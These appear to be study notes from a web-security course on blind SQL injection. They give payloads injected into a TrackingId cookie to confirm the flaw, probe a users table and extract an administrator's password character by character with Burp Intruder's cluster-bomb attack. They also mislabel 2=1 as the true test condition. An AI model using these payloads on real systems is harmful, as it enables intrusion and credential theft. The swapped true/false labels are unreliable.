# Section 14: Blind SQL Injections

## Discovering Blind SQL Injections

- Classic SQL injection
- Attackers can exploit the web application to run SQL queries
- The result is <b>NOT returned to the web application</b>

Example: check in Burp that a GET product request has a request cookie with TrackingId

Run and true statement: `' anD 2=1--`

Run and false statement: `' anD 2=2--`

check the displayed result in the page, for this case the false statement does not display a "Welcome back!" text


Normal Request --> Original Page

True Statement --> Original Page

False Statement --> <b>Different / Broken Page</b>

---

## Enumerating Table & Column Names

> If we get the "Welcome back!" text the statement is true, otherwise is false


Do we have a table that is called Users

 `' anD (SELECT 'a' FROM users LIMIT 1)='a'--`

```
anD 'a' = 'a'---
```


Do we have a column called Y in the Users table?

 ```
 ' anD (SELECT 'a' FROM users WHERE username='administrator')='a'--
```


Do we have a value in table X.

```
 ' anD (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>10)='a'--
```

```
' anD (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a'--
```

---

## Recovering Administrator Password With Burp Intruder

If the first character of the password is 'a'

 ```
 ' anD (SELECT  SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§'--
```
 
If the second character of the password is a
```
' anD (SELECT  SUBSTRING(password,2,1) FROM users WHERE username='administrator')='§a§'--
```

Can use a script or the Burp Intruder (can replace sign params with a payload)

Right click on request -> Send to Intruder

Intruder -> Clear Signs  -> add Injection after tracking Id with two signs -> go to Intruder Payload that will substitute the s signs -> 
Payload type: Brute forcer -> Character set: alphanumeric -> Min length: 1 -> Max length: 2

---

## Using the Cluster-Bomb Attack to Recover Passwords

Cluster-Bomb: Intruder functionality to manipulate two values at the same time

Automatically increase to guess 2nd, 3rd, 4th.. letter

Character and value replacement:

```
' anD (SELECT  SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§'--
```

**Attack type**: Cluster-bomb

**Payload Sets**

First set: Numbers, From: 0, To: 20, Step: 1

Second set: Brute forcer, Min length: 1, Max length: 1

Order by response length, success mean the character guess, Payload 2,  was correct at the place of Payload 1

---
